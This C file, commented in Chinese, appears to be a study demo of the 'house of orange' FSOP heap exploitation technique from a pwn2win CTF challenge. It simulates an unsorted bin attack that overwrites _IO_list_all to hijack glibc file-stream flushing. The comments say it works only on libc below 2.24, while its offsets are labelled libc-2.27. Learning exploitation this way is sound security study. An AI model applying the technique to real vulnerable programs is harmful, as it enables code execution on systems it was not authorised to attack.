// pwn2win Tukro: https://ctftime.org/writeup/20856
// 攻擊手法: https://xz.aliyun.com/t/2411
/* 
註:
        這是 house of orange "那題"的攻擊手法, 但絕對不是 house of orange 的"概念",
        house of orange 的概念是 sysmalloc free 掉 main_arena !!!
        許多人誤用這個詞, 這裡就將就這樣寫
*/

// 重要!! 這個手法只能用在 libc < 2.24

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* libc-2.27 */
#define FREE_OFFSET 0x97950
#define _IO_LIST_ALL_OFFSET 0x3ec660
#define MAIN_ARENA_OFFSET 0x3ebc40

int main()
{
        char *chunk;
        int64_t libc_base = (int64_t)&free - FREE_OFFSET;
        int64_t _IO_list_all = libc_base + _IO_LIST_ALL_OFFSET;
        int64_t unsorted_bin = libc_base + MAIN_ARENA_OFFSET+104;

        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);

        printf("libc_base @ %lx\n", libc_base);
        
        chunk = (char *)malloc(0x500); // 跟 0x500 沒關係, 這是題目限制
        malloc(0x10);

        read(0, chunk, 0x500);
        free(chunk);
        *(int64_t *)(chunk-8) = 0x61;    // _IO_FILE *chain 的偏移量 (0x60)


        malloc(0x500);


        *(int64_t *)_IO_list_all = unsorted_bin; // 模擬 unsorted bin attack
                                                 // 目前 _IO_list_all 指向 unsorted_bin, unsorted_bin->chain = chunk
                                                 // 所以只要構建好 chunk,  _IO_flush_all_lockp 就會呼叫 chunk 的 IO_OVERFLOW (fp, EOF)
                                                 // 但只能用在 libc < 2.24 , 因為 unsorted_bin 無法通過 vtable check 檢查
}